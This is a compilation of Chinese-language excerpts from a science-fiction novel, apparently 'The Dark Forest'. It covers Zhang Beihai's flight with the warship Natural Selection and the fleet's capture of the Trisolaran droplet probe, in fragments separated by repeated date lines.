<p>井上明接着说：“而且这种状态不会持续太长的，对舰队的调查已经接近尾声，基本证明了钢印族并不存在。”</p>
<p>井上明还想说什么，但被舰长的一声低低的惊呼打断了，“哦，天啊。”东方延绪说，两位副舰长顺着她的目光望去，看到了章北海面前的操作界面，因而也看到了“自然选择”号太空战舰目前所处的状态。</p>
<p>战舰已被设定为无人遥控状态，因而绕过了四级加速前对乘员深海状态的检测，战舰与外界的通讯也被完全切断，最后，战舰完成了进入最高推进功率的绝大部分舰长设定，只需再按动一个按钮，“自然选择”号就将以最大的加速度驶向星图上已经设定的目标。</p>
<p>“不，别这样。”东方延绪说，声音低得只有自己能听到，这话是说给她前面呼唤过的那个“天”听的，以前，她自己并不相信它的存在，而现在，她的祈祷是真诚的。</p>
<p>“你疯了？”列文喊道，与井上明一起向舱内冲去，但立刻撞在舱壁上，门并没有出现，只是那一个椭圆形区域的舱壁变得透明了。</p>
<p>“‘自然选择’号将进入‘前进四’，全舰人员立刻进入深海状态。”章北海说，他的声音冷峻而沉稳，每一个字都长久地浮在空气中，像立在寒风中的古老铁锚。</p>
<p>“这不可能！”井上明说。</p>
<p>“你是钢印族吗？”东方延绪问，她飞快地使自己冷静下来。</p>
<p>“你知道我不可能是。”</p>
<p>“ETO？”“也不是。”</p>
<p>“那你是谁？”</p>
<p>“一个尽责任的军人，为人类的生存而战。”</p>
<p>“为什么这样做？”</p>
<p>“加速完成后再解释，再说一遍：全舰人员进入深海状态。”</p>
<p>“这不可能！”井上明重复道。</p>
<p>章北海转过头来，他没有看两位副舰长，目光直视东方延绪，这目光立刻使东方想起了太空军的军徽，星星和剑都在其中。</p>
<p>“东方，我说过如果不得不杀你，我很抱歉。时间不多了。”他说。</p>
<p>2016-01-19</p>
<p>这时，在章北海所在的球形舱内，深海加速液开始出现，它们在失重中形成一个个球体，每个球体上，都有章北海、操作界面和星图的变形映像。液球飘浮着，开始相互组合成更大的球。两位副舰长都看着东方延绪。</p>
<p>“照他说的做，全舰进入深海状态。”舰长轻声说。</p>
<p>两位副舰长凝视着她，他们都知道“前进四”时未处于深海保护状态下的人是什么下场：身体被超过自身重量一百二十倍的过载紧贴在舱壁上，先迸射出的是血液，超重下摊成极薄的一层，血渍的面积大得不可想象并呈放射状；然后挤出的是内脏，也很快被压成薄薄的一层，与被压成一片的身体一起，构成一幅丑陋的达利风格的画……他们同时转身离去，向全舰发出进入深海状态的命令。</p>
<p>“你是一个合格的舰长。”章北海对着东方延绪点点头，“这就是成熟。”</p>
<p>“我们要去哪里？”东方延绪问。</p>
<p>“不管去哪里，都是一个比留在这里更负责任的选择。”</p>
<p>章北海说完，就被深海加速液完全淹没了，东方延绪只能透过已充满球形舱的液体看到他模糊的身影。</p>
<p>章北海悬浮在半透明的液体中，想起了他两个世纪前在海军服役时深度潜水的经历。当时，他没有想到海洋中的几十米深处已经是那么黑，悬浮在那个世界中，很有后来身处太空的感觉，海洋是太空在地球上的缩影。他试着在液体中呼吸了一下，神经反射使他剧烈地咳嗽起来，咳出的液体和残留气体产生的反冲力使他的身体倾斜了，但想象中的窒息并没有出现，清凉的液体充满了肺部，其中富含的氧继续融进他的血液，他能够像鱼一样自由呼吸了。</p>
<p>2016-01-19</p>
<p>章北海看着悬浮在液体中的显示界面，看到深海加速液依次充满飞船上各个有人的舱室，这个过程持续了十多分钟。渐渐地，他的意识开始模糊，呼吸液中开始注入催眠成分，以使飞船上的所有人进入睡眠状态，避免四级加速时的高压和相对缺氧对大脑的损害。</p>
<p>2016-01-19</p>
<p>木星轨道上突然出现了一颗小太阳，它强烈的光芒使得行星上大气层中的磷光黯然失色。拖着这颗小太阳的“自然选择”号恒星级战舰缓缓驶出亚洲舰队的军港，然后急剧加速，把舰队中其他战舰的影子投到木星表面，每个影子的大小都可以容下一个地球。十分钟后，一个更大的影子投向木星，仿佛给这颗巨行星的表面拉上一块幕布，这是“自然选择”号正掠过木卫一。</p>
<p>直到这时，亚洲舰队统帅部才确认了这个令人难以置信的事实：“自然选择”号叛逃了！</p>
<p>2016-01-19</p>
<p>欧洲和北美舰队向亚洲舰队提出抗议和警告，它们最初认为这可能是亚洲舰队擅自拦截三体探测器的行动，但很快就从“自然选择”的航向上发现不是这么回事，它的航向与三体入侵的方向相反。</p>
<p>2016-01-19</p>
<p>各个系统向“自然选择”号的呼叫因得不到回答而渐渐平息下来，追击和拦截行动开始部署。但统帅部很快发现，目前对叛舰几乎无事可做。在木星的众多卫星上，有四颗卫星的火力可以摧毁“自然选择”号，但这是一个不可能采取的行动，实施叛逃行动的应该只是舰上的极少数甚至一个人，两千多名在深海状态中的官兵都是人质。所以，在木卫二上伽马射线激光武器的基站中，指挥官们只能看着那颗小太阳掠过天空飞向外太空，在它的光芒下，木卫二的广阔冰原上像是撒满了燃烧的白磷。</p>
<p>“自然选择”号依次穿过木星的十六颗大卫星的轨道，在穿越木卫四轨道时已经达到了木星的逃逸速度。从亚洲舰队基地看去，那颗小太阳渐渐缩小，变成一颗明亮的星星，但在以后长达一个星期的时间里，这颗星星仍依稀可见，在群星中隐现着亚洲舰队无尽的伤痛。</p>
<p>2016-01-19</p>
<p>由于需要进入深海状态，追击舰队在“自然选择”号离去后四十五分钟才起航，木星系统再一次被六个太阳照耀。</p>
<p>2016-01-19</p>
<p>在已经停止旋转的亚洲舰队司令部里，舰队司令默默地面对着处于黑夜一面的巨大的木星，在他下方一万公里的大气层中，出现了一片闪电，刚刚离去的“自然选择”号和追击舰队的聚变发动机向木星发出了强大的辐射，使大气电离引发了闪电。这个距离上只能看到被每一次闪电所照亮的周围大气的光晕，不同位置的光晕转瞬即逝，使得木星的这一片区域像滴落着荧光雨点的池塘。</p>
<p>2016-01-19</p>
<p>“自然选择”号在沉默中持续加速到光速的百分之一后，它的聚变燃料的消耗已经越过折返点，凭自己的动力已经不可能返回太阳系，它成为了一艘永远在外太空流浪的孤舟。</p>
<p>2016-01-19</p>
<p>亚洲舰队司令遥望星空，试图看到那颗星星，但没有找到，那个方向上，只有追击舰队的聚变发动机发出的六点暗弱的星光。他很快得到报告，“自然选择”号已经停止加速。稍后，“自然选择”号与舰队的通讯恢复了。以下是通话记录，由于飞船的位置已在五百万公里之外，对话有十多秒钟的时滞。</p>
<p>“自然选择”号：“‘自然选择’呼叫亚洲舰队！‘自然选择’呼叫亚洲舰队……”</p>
<p>亚洲舰队：“‘自然选择’号，亚洲舰队已收到你的呼叫，请报告舰上情况。”</p>
<p>“自然选择”号：“我是执行舰长章北海，要直接同舰队司令官对话。”</p>
<p>舰队司令：“我在听着。”</p>
<p>章北海：“我对‘自然选择’号的脱离航行负完全责任。”</p>
<p>舰队司令：“还有别人需要负责吗？”</p>
<p>章北海：“没有，只有我一人，这次事件与‘自然选择’号上的其他成员没有任何关系，东方延绪舰长在关键时刻做出了正确的决定。”</p>
<p>舰队司令：“我要与她进行通话。”</p>
<p>章北海：“现在不行。”</p>
<p>舰队司令：“目前舰上情况如何？”</p>
<p>章北海：“一切良好，除我之外的所有舰上人员仍在深海状态中，动力系统和生态系统运转正常。”</p>
<p>舰队司令：“你叛逃的原因？”章北海：“逃离是事实，但我没有背叛。”</p>
<p>舰队司令：“原因？”</p>
<p>章北海：“在这场战争中，人类必败。我只是想为地球保存一艘恒星际飞船，为人类文明在宇宙中保留一粒种子、一个希望。”</p>
<p>舰队司令：“这么说，你是逃亡主义者。”</p>
<p>章北海：“我只是一名尽自己责任的军人。”</p>
<p>舰队司令：“你接受过思想钢印吗？”</p>
<p>章北海：“您知道这不可能，我冬眠时这种技术还没有出现。”</p>
<p>舰队司令：“那你的这种异常坚定的失败主义信念让人不可理解。”</p>
<p>章北海：“我不需要思想钢印，我是自己信念的主人。这种信念之所以坚定，是因为它不是来自我一个人的智慧。早在三体危机出现之初，父亲和我就开始认真思考这场战争最基本的问题。渐渐地，父亲身边聚集了一批有着深刻思想的学者，他们包括科学家、政治家和军事战略家，他们称自己为未来史学派。”</p>
<p>2016-01-19</p>
<p>舰队司令：“这是一个秘密组织吗？”</p>
<p>章北海：“不是，他们研究的问题很基础，讨论从来都是公开进行的，甚至还由军方和政府出面，召开了几次未来史学派的学术研讨会。正是从他们的研究中，我确立了人类必败的思想。”</p>
<p>舰队司令：“可是现在未来史学派的理论已被证明是错误的。”</p>
<p>章北海：“首长，您低估了他们，他们不但预言了大低谷，也预言了第二次启蒙运动和第二次文艺复兴，他们所预言的今天的强盛时代，几乎与现实别无二致，最后，他们也预言了末日之战中人类的彻底失败和灭绝。”</p>
<p>舰队司令：“可是，你现在身处的飞船，能够以光速的百分之十五航行。”</p>
<p>章北海：“成吉思汗的骑兵，攻击速度与20世纪的装甲部队相当；北宋的床弩，射程达一千五百米，与20世纪的狙击步枪差不多；但这些仍不过是古代的骑兵与弓弩而已，不可能与现代力量抗衡。基础理论决定一切，未来史学派清楚地看到了这一点。而你们，却被回光返照的低级技术蒙住了眼睛，你们躺在现代文明的温床中安于享乐，对即将到来的决定人类命运的终极决战完全没有精神上的准备。”</p>
<p>舰队司令：“你来自一支伟大的军队，他们曾战胜了装备远比自己先进的敌人，甚至仅凭缴获的武器就打胜了一场世界罕见的大规模陆战。你的行为，辱没了这支军队的荣耀。”章北海：“尊敬的司令官，我比您更有资格谈论那支军队，因为我家祖孙三代都在其中服役。我的爷爷曾在朝鲜战场用手榴弹攻击美军的‘潘兴’坦克，手榴弹砸到坦克上滑下来爆炸，目标毫发未损，爷爷在被坦克上的机枪击中后，又被履带轧断双腿，在病榻上度过了后半生，但比起同时被轧成肉酱的两名战友来，他还算幸运……正是这支军队的历程，使我们对战争中与敌人的技术差距刻骨铭心。你们所知道的荣耀是从历史记载中看到的，我们的创伤是父辈和祖辈的鲜血凝成的，比起你们，我们更知道战争是怎么回事。”</p>
<p>2016-01-19</p>
<p>舰队司令：“叛逃计划是什么时候产生的？”</p>
<p>章北海：“我重申：自己没有背叛，但逃亡是事实。这个计划从见父亲最后一面时就产生了，他用最后的目光告诉了我该怎样做，我用了两个世纪来实施这个计划。”</p>
<p>舰队司令：“为此你把自己伪装成一个坚定的胜利主义者，你的伪装很成功。”</p>
<p>章北海：“但常伟思将军几乎识破了我。”</p>
<p>舰队司令：“是的，他敏锐地意识到自己从未看清你的胜利主义信念的基础，你后来对能够进行恒星际航行的辐射推进型飞船的不正常的热衷，更加剧了他的怀疑。他一直反对你进入增援未来特遣队，但无法违背上级的指示。在给我们的信中，他提出了警告，但却是以那个时代所特有的含蓄方式提出的，结果被我们忽略了。”</p>
<p>章北海：“为得到能够进行星际逃亡的飞船，我杀了三个人。”</p>
<p>舰队司令：“这我们不知道，可能谁也不知道，但有一点应该肯定：那时所确定的研究方向对后来的宇航技术发展是至关重要的。”</p>
<p>章北海：“谢谢你告诉我这个。”</p>
<p>舰队司令：“我还要告诉你，你的计划失败了。”</p>
<p>章北海：“也许会，但现在还没有。”</p>
<p>舰队司令：“‘自然选择’号在起航时只加注了五分之一的聚变燃料。”</p>
<p>章北海：“但我只能立刻行动，以后就没有机会了。”</p>
<p>舰队司令：“这样，你只能加速到光速的百分之一，你不敢过多消耗燃料，因为飞船的生态循环系统需要能量来维持运转，这段时间少则几十年，多则几个世纪。而以这样的速度航行，追击舰队能够很快追上你们。”</p>
<p>章北海：“我仍控制着‘自然选择’号。”</p>
<p>舰队司令：“不错，你当然知道我们的担心：追击会使你继续加速，耗尽燃料，没有能量的生态系统将停止转动，‘自然选择’号将变成一艘接近绝对零度的死船。所以追击舰队暂时不会与‘自然选择’号近距离接触，我们很有信心地认为，‘自然选择’号上的官兵会解决自己战舰的问题。”</p>
<p>章北海：“我也相信一切问题都会解决的，我将负自己应该负的责任，但目前我仍坚信，‘自然选择’号处在正确的航向上。”</p>
<p>2016-01-19</p>
<p>不过，这次与第二次穿越时相似，首先观察到的是一根前出的“刷毛”，但与那次不同的是，从轨迹形态判断，这根刷毛不是探测器，而是舰队中的一艘战舰。在向太阳系的航程中，三体舰队已经完成了加速和巡航期。早在十五年前，已经观测到三体战舰陆续开始减速，十年前，绝大部分战舰都进入减速状态。不过现在知道，这艘战舰一直没有减速，从它在尘埃云中的轨迹看，依然处于加速状态，按目前的加速率，它将比舰队提前一个半世纪到达太阳系。这样一艘孤单的飞船，独自闯入拥有强大舰队的太阳系疆域，如果是入侵则无异于送死，所以只能得出一个结论：它是来谈判的。通过对三体舰队长达两个世纪的观察，已经确定了每艘飞船的最大加速能力，照此推算，这艘前出的飞船缺少足够的减速能力，一百五十年后必然会掠过太阳系，那么就存在两种可能：其一是三体人希望地球世界协助减速，其二是飞船在掠过太阳系前会放下一个容易减速的小艇，上面运载着三体世界的谈判代表团。后一种可能性要大得多。</p>
<p>2016-01-19</p>
<p>议员的最后一句话是对他的随行团队说的，他们正忙收集散落在地上的西红柿，这在地下城毕竟是很贵的东西。看到这一幕，冬眠者们又开始向讲坛上扔黄瓜土豆什么的，使得这一次小小的冲突最终在双方共同的欢乐中结束。</p>
<p>2016-01-19</p>
<p>中午，家家摆宴庆贺，还在小区的草坪上为乘兴而来的城里人——包括东郭族议员和他的团队——摆上了丰盛的纯农产品大餐。下午，狂欢在一片醉意中继续，直到夕阳西下。今天的黄昏格外美丽，小区外的沙原在橙红的夕阳下显得如奶油般柔软细腻，连绵的沙丘像睡卧的女性胴体……</p>
<p>2016-01-19</p>
<p>接着，一颗灿烂的亮星从木星分离出来，仿佛是它的灵魂脱离了躯体，木星又恢复到本来的亮度，而那颗亮星则缓缓移动，渐渐拉大与木星的距离，那就是起航的联合舰队。</p>
<p>2016-01-19</p>
<p>几乎与此同时，发自木星基地的实况图像也到达了地球，人们从电视中看到，在漆黑的太空中，突然出现了两千个太阳！它们排成一个长方形的严整阵列，赫然出现在永恒的宇宙之夜中，让人们不约而同地想起了一句话：上帝说要有光，于是有了光。在两千个太阳的照耀下，木星和它的卫星都像在燃烧，木星大气层被辐射电离，引发的闪电布满了行星面向舰队的半个表面，构成了一张电光闪烁的巨毯。舰队开始加速，但阵列丝毫不乱，这堵太阳的巨墙以雷霆万钧的气势向太空深处庄严推进，向整个宇宙昭示着人类的尊严和不可战胜的力量。两个世纪前被三体舰队出发的影像所压抑的人类精神，终于得到了彻底的解放。这一时刻，银河系的星海默默地收敛了自己的光芒，大写的“人”与上帝合为一体，傲然独步于宇宙间。</p>
<p>2016-01-19</p>
<p>我知道。”章北海说，没有抬头，“你让全舰保持深海状态是很明智的。”</p>
<p>“只能这样，否则情绪激动的士兵和军官会攻击这个舱，而你随时可能使‘自然选择’号进入‘前进四’，杀死所有的人。追击舰队没有靠近，也是这个原因。”</p>
<p>章北海没有说话，把笔记本翻过一页，继续写着。</p>
<p>“你不会这么做，是吗？”东方延绪轻声问。“你当初也不可能想到我会做现在的事。”章北海停了几秒钟，补充说，“我们时代的人有我们的思维方式。”</p>
<p>“可我们不是敌人。”</p>
<p>“没有永恒的敌人或同志，只有永恒的责任。”</p>
<p>“那你对战争的悲观完全没有道理，现在，三体世界已经表露了谈判的迹象，太阳系联合舰队已经起航去拦截三体探测器，战争就要以人类的胜利结束了。”</p>
<p>“我看过传来的新闻了……”</p>
<p>“你仍坚持自己的失败主义和逃亡主义？”</p>
<p>“是的。”东方延绪无奈地摇摇头，“你们的思维方式真的与我们不同，比如，你在开始时就知道自己的计划不可能成功，‘自然选择’号只加装了五分之一的燃料，肯定会被追上。”</p>
<p>章北海停下手中的笔，抬头看着舱外的东方延绪，他的目光平静如水，“同为军人，知道我们之间最大的区别在哪里吗？你们按照可能的结果来决定自己的行动；而我们，不管结果如何，必须尽责，这是唯一的机会，所以我就做了。”</p>
<p>“是为了给自己一个安慰吗？”</p>
<p>“不，本性而已，东方，我不指望你能理解，毕竟我们相隔两个世纪了。”“那现在你已经尽到你所说的责任了，你的逃亡事业已经没有任何希望，投降吧。”</p>
<p>章北海对东方延绪笑笑，低头继续写，“还不到时候。我要把自己所经历的这一切写下来，相隔两个世纪的这一切，都写下来，在以后的两个世纪中，这也许对一些头脑清醒的人会有帮助的。”</p>
<p>“你可以口述，电脑会记下来。”</p>
<p>“不，我习惯用笔写，纸会比电脑保存得更久。你放心，我会承担一切责任的。”</p>
<p>2016-01-19</p>
<p>联合舰队的编队十分密集，这种队形密度只有进行检阅时才采用过。按照正常的巡航编队，战舰之间的间距应该在三百到五百公里，二十公里的舰距，几乎相当于海洋中的贴舷航行。三大舰队中都有很多将领对这种超密集的队形提出异议，但采用常规队形却遇到棘手的问题。首先就是参战机会的公平性原则，如果以常规队形接近探测器，即使逼近到最小的距离，编队边缘的战舰距目标仍有几万公里之遥，如果在对探测器的捕获行动中发生战斗，那么相当多的战舰就不能算做是参战舰了，这将在历史上留下永远的遗憾。而三大舰队都不能拆散自己的编队，那么哪个舰队位于总编队中最有利的位置就无法协调，只能把编队压缩到超密集的检阅队形，使所有战舰都处于作战距离之内。采用检阅队形的另一个原因是：舰队国际和联合国都希望编队能够产生强烈的视觉震撼，这与其说是对三体世界的力量显示，不如说是做给人类公众看的，这种前所未有的视觉冲击，对两个国际都具有重大的政治意义。目前，敌人主力仍在遥远的两光年之外，舰队的密集编队当然不会有什么危险。</p>
<p>2016-01-19</p>
<p>丁仪把烟斗放到嘴里，在这个时代他找不到烟丝，只能叼着空烟斗。两个世纪后的烟斗居然还残留着烟味，只是很淡，隐隐约约，像过去的记忆。</p>
<p>2016-01-19</p>
<p>丁仪是七年前苏醒的，一直在北京大学物理系任教。他去年向舰队提出请求，希望在三体探测器被拦截后成为第一个零距离考察它的人。丁仪虽然德高望重，但他的请求一直被拒绝，直到他声称要死在三大舰队司令面前，舰队方面才答应考虑这事。其实，第一个接触探测器的人选一直是个难题，首次接触探测器就等于首次接触三体世界，按照拦截行动中的公平原则，三大舰队中任何一方都不可能被允许单独享有这个荣誉，而如果让三方派出的人员同时接触，在操作上也有难度，容易横生枝节，所以只有让一个舰队国际之外的人承担这个使命，丁仪当然是最合适的人选。而丁仪的请求最后被批准，还有一个不能明说的原因。其实，对于最后能否得到探测器，无论是舰队还是地球国际都没有信心，它在被拦截中或拦截后有很大可能要自毁，而在它自毁前如何从中得到尽可能多的信息，零距离观察和接触是不可替代的手段，丁仪作为发现宏原子和发明可控核聚变途径的资深物理学家，是最具备这方面素质的人。反正生命是他自己的，以他八十三岁的年龄和无人能比的资历，自然有权利拿这条老命干他想干的事。</p>
<p>2016-01-19</p>
<p>探测器的大小与预想的差不多，长三点五米，丁仪看到它时，产生了与其他人一样的印象：一滴水银。探测器呈完美的水滴形状，头部浑圆，尾部很尖，表面是极其光滑的全反射镜面，银河系在它的表面映成一片流畅的光纹，使得这滴水银看上去简洁而唯美。它的液滴外形是那么栩栩如生，以至于观察者有时真以为它就是液态的，根本不可能有内部机械结构。</p>
<p>2016-01-19</p>
<p>看过探测器的影像后，丁仪便沉默了，在会上一直没有说话，脸色有些阴沉。</p>
<p>“丁老，您好像有什么心事？”舰长问。</p>
<p>“我感觉不好。”丁仪低声说，用手中的烟斗指指探测器的全息影像。</p>
<p>“为什么？它看起来像一件无害的艺术品。”一名军官说。</p>
<p>“所以我感觉不好。”丁仪摇摇花白的头说，“它不像星际探测器，却像艺术品。一样东西，要是离我们心中的概念差得太远，可不是好兆头。”</p>
<p>“这东西确实有些奇怪，它的表面是全封闭的，发动机的喷口呢？”“可它的发动机确实能发光，这都是曾经观测到的，只是当时‘蓝影’号在它再次熄火前没来得及拍下近距离的影像，不知道那光是从哪里发出来的。”</p>
<p>“它的质量是多少？”丁仪问。</p>
<p>“目前还没有精确值，只有通过高精度引力仪取得的一个粗值，大约在十吨以下吧。”</p>
<p>“那它至少不是用中子星物质制造的了。”</p>
<p>2016-01-19</p>
<p>一名年轻的女军官向丁仪敬礼，同舰队中的其他女性一样，她身材颀长苗条，是典型的太空新人类。</p>
<p>丁仪只瞥了少校一眼，就转向舰长：“怎么还有别人？我一个人去不就行了？”</p>
<p>“这当然不行，丁老，您对太空环境不熟悉，整个过程是需要人辅助的。”</p>
<p>“要这样，我还是不去的好，难道还要别人跟着我……”丁仪没有说出“送死”两个字。</p>
<p>2016-01-19</p>
<p>事实上，地球和舰队两个国际决定尽快派人与探测器直接接触，主要目的不是为了考察。当全世界第一次看到探测器的影像时，所有人都陶醉于它那绝美的外形。这东西真的是太美了，它的形状虽然简洁，但造型精妙绝伦，曲面上的每一个点都恰到好处，使这滴水银充满了飘逸的动感，仿佛每时每刻都在宇宙之夜中没有尽头地滴落着。它给人一种感觉：即使人类艺术家把一个封闭曲面的所有可能形态平滑地全部试完，也找不出这样一个造型。它在所有的可能之外，即使柏拉图的理想国中也没有这样完美的形状，它是比直线更直的线，是比正圆更圆的圆，是梦之海中跃出的一只镜面海豚，是宇宙间所有爱的结晶……美总是和善连在一起的，所以，如果宇宙中真有一条善恶分界线的话，它一定在善这一面。</p>
<p>于是很快出现了一个猜测：这东西可能根本就不是探测器。进一步的观察在某种程度上证实了这种猜测。人们首先注意到，它的表面有着极高的光洁度，是一种全反射镜面，舰队曾经动用大量的监测设备做过一次实验，用不同波长的高频电磁波照射它的所有表面，同时测量电磁波的反射率。结果惊讶地发现：它的表面对于包括可见光在内的高频电磁波，几乎能够百分之百地反射，观察不到任何吸收。这就意味着它无法在高频波段进行任何探测，通俗地说它是个瞎子。这种自盲的设计肯定有重要的含义，最合理的推测是：它是三体世界发往人类世界的一个信物，用其去功能化的设计和唯美的形态来表达一种善意，一种真诚的和平愿望。于是，人们给探测器换了个称呼，形象地叫它“水滴”。在两个世界中，水都是生命之源，象征着和平。</p>
<p>舆论认为应该派出人类社会的正式代表团与水滴接触，而不是由一名物理学家和三名普通军官组成的考察队，但出于谨慎的考虑，舰队国际决定维持原计划不变。</p>
<p>“那就不能换个人去吗？让这么个女孩子……”丁仪指着西子说。</p>
<p>西子对丁仪微笑着说：“丁老，我是‘量子’号上的科学军官，负责航行中的出舰科学考察，这是我的职责。”</p>
<p>“而且，舰队中有一半是女孩子。”舰长说，“陪同您的共有三个人，另外两名是欧洲和北美舰队派出的科学军官，他们很快就要到本舰报到了。丁老，这里要重申一点：按照舰队联席会议的决议，第一个直接接触目标的一定是您，然后才能允许他们接触。”</p>
<p>“无聊。”丁仪又摇摇头，“人类在这方面一点儿没变，热衷于追逐虚荣……不过你们放心，我会照办的。其实我只想看看而已，我真正感兴趣的是这些超技术后面的超理论，不过此生怕是……唉。”</p>
<p>舰长飘浮到丁仪面前，关切地对他说：“丁老，您现在可以去休息了，捕获行动很快就要开始，在出发考察前，您一定要保持足够的精力。”</p>
<p>2016-01-19</p>
<p>丁仪抬头看着舰长，好半天才悟出来他走后会议还要继续进行</p>
<p>2016-01-19</p>
<p>他再看看悬浮在自己面前的“量子”号的指挥官们，他们都很年轻，在丁仪眼中，这些人还都是孩子。他们看上去都是那么高贵和完美，从舰长到上尉，眼中都透出神灵般睿智的亮光。舰队的光芒从舷窗射入，透过自动变暗的玻璃后，变成晚霞般的金色，他们就笼罩在这片金辉中，身后悬浮着水滴的影像，像一个超自然的银色符号，使这里显得空灵而超脱，他们看上去，像奥林匹斯山上的神祇……丁仪内心深处的什么东西被触动了，他变得激动起来。</p>
<p>2016-01-19</p>
<p>“哦，我想说……”丁仪的两手不知所措地乱舞着，任烟斗飘在空中，“我想说，孩子们啊，这些天来，你们对我都很好……”</p>
<p>“您是我们最尊敬的人。”一位副舰长说。</p>
<p>“哦……所以，我真的有些话想说，只是……一个老东西的胡言乱语，你们也可以不把它当真。不过，孩子们，我毕竟是跨过两个世纪的人了，经历的事儿也多一些……当然，我说过，也不必太当真……”</p>
<p>“丁老，有什么话您就直说吧，您真的是我们最尊敬的人。”</p>
<p>丁仪缓缓地点点头，向上指指，“这艘飞船，要达到最高的加速度，这里面的人好像都得……都得浸在一种液体里。”</p>
<p>“是的，深海状态。”</p>
<p>“对对，深海状态。”丁仪又犹豫起来，沉吟了一会儿才下决心说下去，“在我们出发去考察后，这艘飞船，哦，‘量子’号，能不能进入深海状态？”军官惊奇地互相对视着，舰长问：“为什么？”</p>
<p>丁仪的两手又乱舞起来，头发在舰队的光芒中发出白光，正像一上舰时就有人发现的那样，他真的很像爱因斯坦。“嗯……反正这样做也没什么大的损失，对吧……你们知道，我感觉不好。”</p>
<p>丁仪说完这话就沉默了，两眼茫然地看着无限远方，最后伸手把飘浮的烟斗抓过来装到衣袋中，也不道别，笨拙地操纵着超导腰带向舱门飘去。军官们一直目送着他，当他的半个身体已经出门时，又慢慢地转过身来：</p>
<p>“孩子们，你们知道我这些年都在干什么吗？在大学里教物理，还带博士生。”他遥望着外面的星河，脸上露出莫测的笑容，军官们发现，那笑容竟有些凄惨，“孩子们啊，我这两个世纪前的人了，现在居然还能在大学里教物理。”他说完，转身离去。</p>
<p>2016-01-19</p>
<p>舰长想对丁仪说什么，但见到他已经离去就没有说出来，神色严峻地思索着。军官们中有人看着水滴的影像，更多的人把目光聚集在舰长身上。</p>
<p>“舰长，你不会拿他的话当真吧？”一名上校问。</p>
<p>“他是个睿智的科学家，但毕竟是个古人，思考现代的事儿，总是……”有人附和道。</p>
<p>“可是在他的领域里，人类一直没进步，还停留在他的时代。”</p>
<p>“他提到直觉，想想他的直觉都发现过些什么吧。”说话的军官语气里充满着敬畏。</p>
<p>“而且……”西子脱口而出，但看看周围军衔比她高的一群人，把话又咽了回去。</p>
<p>“少校，说吧。”舰长说。</p>
<p>“而且像他说的，也没什么损失。”西子说。</p>
<p>“可以从其他方面想想……”一位副舰长说，“按目前的作战计划，如果捕获失败，水滴意外逃脱，舰队部署的追踪力量只有歼击机，但如果长途追踪就必须依靠恒星级战舰，舰队中应该有舰只做好这方面的准备，这应该看做计划的一个疏漏。”</p>
<p>“向舰队打一个报告吧。”舰长说。</p>
<p>舰队很快批复：在考察队出发后，“量子”号和在编队中与其相邻的“青铜时代”号两艘恒星级战舰进入深海状态。</p>
<p>2016-01-19</p>
<p>捕获水滴的过程中，联合舰队的编队与目标的距离保持在一千公里，这是经过审慎计算后确定的。对于水滴可能的自毁方式有多种猜测，所能设想的产生最大能量的自毁就是正反物质湮灭，水滴的质量小于十吨，那么在留有充分冗余量的情况下，所需考虑的最大的能量爆发就是由质量各为五吨的正反物质湮灭产生的。如果这样的湮灭发生在地球上，足以毁灭这颗行星表面的所有生命，但在太空中发生，其能量全部以光辐射的形式出现，对于拥有超强防辐射能力的恒星级战舰来说，一千公里的距离是足够安全的。</p>
<p>2016-01-19</p>
<p>舰队看到的图像，要经过三个小时才能以光速传回地球，传到同样屏息注视的三十亿人眼中。这时的人类世界几乎停止了一切活动，巨树间的飞车流消失了，地下大都市都笼罩在一片寂静之中，甚至连诞生后繁忙了三个世纪的全球互联网也变得空旷起来，所传输的数据大部分是来自二十个天文单位外的影像。</p>
<p>2016-01-19</p>
<p>螳螂”号走走停停，用了一个半小时才飞完了这段在太空中连一步之遥都不到的路程，最后悬停在距目标五十米的地方，这时，从水滴的水银表面上可以清晰地看到“螳螂”号变形的映像。</p>
<p>2016-01-19</p>
<p>螳螂”号向目标伸出了它的超长机械臂，在五十米的距离上也是伸伸停停，但密集的监视系统没有发现目标的任何异常。这个同样折磨人的过程持续了半个小时，机械臂的前端终于到达目标所在的位置，接触到这个来自四光年外，在太空中跋涉了近两个世纪的物体。当机械臂的六指夹具最后夹紧了水滴时，舰队百万人的心脏同时悸动了一下，三小时后这同样的悸动将在地球上的三十亿颗心脏上出现。机械臂夹着水滴静静地等待了十分钟，目标仍然没有任何反应和异常，于是机械臂开始拉着它回收。</p>
<p>2016-01-19</p>
<p>这时，人们发现了一个奇异的对比：机械臂显然是一个在设计上只重功能的东西，钢骨嶙峋，加上那些外露的液压设备，充满了繁杂的技术秉性和粗陋的工业感；而外形完美，它们晶莹流畅的固态液滴——水滴，则用精致的唯美消弭了一切功能和技术的内涵，表现出哲学和艺术的轻逸和超脱。机械臂的钢爪抓着水滴，如同一只古猿的毛手抓着一颗珍珠。水滴看上去是那么脆弱，像太空中的一只暖瓶胆，所有人都担心它会在钢爪下破碎。但这事终于没有发生，机械臂开始回缩了。</p>
<p>2016-01-19</p>
<p>而水滴的到来，使人们对三体世界的感情开始发生微妙的变化，越来越多的人开始意识到：那个正在向太阳系跋涉的种族是一个伟大的文明，他们经历了两百多次灾难的轮回，以令人类难以置信的顽强生存下来，他们历尽艰辛跨越四光年的漫漫太空，只是为了寻找一个稳定的太阳，一处生息延续的家园……公众对三体世界的感情，开始由敌视和仇恨转向同情、怜悯甚至敬佩。人们同时也意识到这样一个事实：三体世界的十个水滴在两个世纪前就发出了，而人类直到现在才真正理解了它们的含义，这固然因为三体文明的行为过分含蓄，也从另一个方面反映了人类被自己的血腥历史所扭曲的心态。</p>
<p>2016-01-19</p>
<p>全球网上的公民投票中，阳光计划的支持率急剧上升，且有越来越多的人倾向于把火星作为三体居留地的强生存方案。</p>
<p>联合国和舰队加快了和平谈判的准备工作，两个国际开始联合组建人类代表团。</p>
<p>这一切，都是在水滴被捕获后的一天内发生的。</p>
<p>2016-01-19</p>
<p>在太阳另一侧几乎同样距离的太空中，“自然选择”号静静地以光速的百分之一滑行着。</p>
<p>2016-01-19</p>
<p>东方，不要减速。”</p>
<p>“为什么？”</p>
<p>“减速将耗尽‘自然选择’号的剩余燃料，我们不能成为一艘没有能量的飞船，谁也不知道将会发生什么，作为舰长你应该想到这点。”</p>
<p>“能发生什么？未来已经很清晰了，战争将结束，人类将胜利，而你被证明完全错了！”</p>
